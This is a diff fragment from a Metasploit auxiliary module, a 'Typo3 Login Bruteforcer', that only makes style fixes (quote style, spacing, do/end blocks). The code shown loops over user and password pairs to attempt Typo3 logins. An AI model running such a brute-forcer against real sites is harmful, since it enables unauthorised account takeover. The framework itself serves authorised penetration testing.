@@ -11,19 +11,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Typo3 Login Bruteforcer',
+      'Name' => 'Typo3 Login Bruteforcer',
       'Description' => 'This module attempts to bruteforce Typo3 logins.',
-      'Author'      => [ 'Christian Mehlmauer' ],
-      'License'     => MSF_LICENSE
+      'Author' => [ 'Christian Mehlmauer' ],
+      'License' => MSF_LICENSE
     )
   end
 
   def run_host(ip)
-    print_status("Trying to bruteforce login")
+    print_status('Trying to bruteforce login')
 
     res = send_request_cgi({
-      'method'  => 'GET',
-      'uri'	 => target_uri.to_s
+      'method' => 'GET',
+      'uri'	=> target_uri.to_s
     })
 
     unless res
@@ -31,9 +31,9 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    each_user_pass { |user, pass|
-      try_login(user,pass)
-    }
+    each_user_pass do |user, pass|
+      try_login(user, pass)
+    end
   end
 
   def report_cred(opts)
